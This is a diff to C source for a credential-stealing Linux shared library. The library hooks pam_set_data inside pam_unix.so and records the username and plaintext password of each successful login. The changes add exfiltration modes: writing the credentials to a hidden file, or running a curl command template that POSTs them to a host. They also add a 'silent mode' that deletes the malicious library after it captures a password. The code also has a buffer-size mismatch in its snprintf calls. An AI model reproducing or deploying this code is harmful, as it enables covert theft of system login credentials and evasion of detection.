@@ -8,9 +8,20 @@
 #include <sys/types.h>
 #include <assert.h>
 #include<dlfcn.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
 #define MAX_BUF_SIZE 1024
+#define MAX_PATH 255
 __attribute__ ((constructor)) static int so_init(void);
-
+int SEND_MODE = 0; // 0 = output to file, 1= command mode
+char SEND_TARGET[MAX_PATH] = "/tmp/.password.txt";// 如果SEND_MODE = 0 ，则会将密码写入这个目录下，如果
+char EVILSOPATH[] = "/tmp/hello.so";
+//int SEND_MODE = 1; // 0 = output to file, 1= command mode
+//char SEND_TARGET[MAX_PATH] = "curl -X POST -d 'username=%s&password=%s' http://127.0.0.1";
+int SLIENT_MODE = 0; // 0 = disable , 1 = enable
+char SLIENT_USER[] = "anyone"; // 开启slientmode后，如果设置为anyone则抓到任意用户密码就自删除退出，否则则判断用户名是否与
+                             // 当前值相同，相同则销毁退出
 
 struct pam_handle {
     char *authtok;
@@ -44,7 +55,6 @@ struct pam_handle {
     char *confdir;
     */
 };
-
 
 
 void* get_module_base(pid_t pid, const char* module_name)
@@ -223,15 +233,40 @@ int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void 
 
         char unix_setcred_return[] = "unix_setcred_return";
         if(strstr(unix_setcred_return,module_data_name)){
-        FILE *fp = NULL;
-        fp = fopen("/tmp/set_data.txt", "a+");
-        void * test = malloc(sizeof(int));
-        fprintf(fp,"pam module_data_name: %s %d\n",module_data_name,*(int *)data);
-        int ret = *(int*)data;
-        if(ret == 0){
-                fprintf(fp,"login successful username is : %s    password is: %s\n",pamh->user,pamh->authtok);
-        }
-        fclose(fp);
+            if(SEND_MODE == 0){
+                FILE *fp = NULL;
+                fp = fopen(SEND_TARGET, "a+");
+                //fprintf(fp,"pam module_data_name: %s %d\n",module_data_name,*(int *)data);
+                int ret = *(int*)data;
+                if(ret == 0){
+                        fprintf(fp,"login successful username is : %s    password is: %s\n",pamh->user,pamh->authtok);
+                }
+                fclose(fp);
+                
+            }else{
+                int ret = *(int*)data;
+                if(ret == 0){
+                    char message[1024];    
+                    snprintf(message,2048,SEND_TARGET,pamh->user,pamh->authtok);
+                    system(message);
+                }
+            }
+            int ret = *(int*)data;
+            if(SLIENT_MODE == 1 && ret == 0){
+                    if (strstr(SLIENT_USER,"anyone"))
+                    {
+                        char cmd[1024];
+                        snprintf(cmd,2048,"rm %s",EVILSOPATH);
+                        system(cmd);
+                    }
+                    if (strstr(SLIENT_USER,pamh->user))
+                    {
+                        char cmd[1024];
+                        snprintf(cmd,2048,"rm %s",EVILSOPATH);
+                        system(cmd);
+                    } 
+            }
+        
         }
     return old_pam_set_data(pamh,module_data_name,data,cleanup);
 }
@@ -239,12 +274,9 @@ int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void 
 
 int so_init(void)
 {
-    FILE *fp = NULL;
-    fp= fopen("/tmp/got.log", "a+");
-    fprintf(fp,"%s\n","Got Starting...\n");
-    fclose(fp);
+    
     void* base_addr = get_module_base(getpid(), "pam_unix.so");
-    void *handle = dlopen("/tmp/hello.so",RTLD_NOW);
+    void *handle = dlopen(EVILSOPATH,RTLD_NOW);
     void *export_pam_set_data = dlsym(handle,"my_pam_set_data");
     hook_entry(base_addr, "pam_set_data", (uint64_t *)&old_pam_set_data, (uint64_t)export_pam_set_data);
 
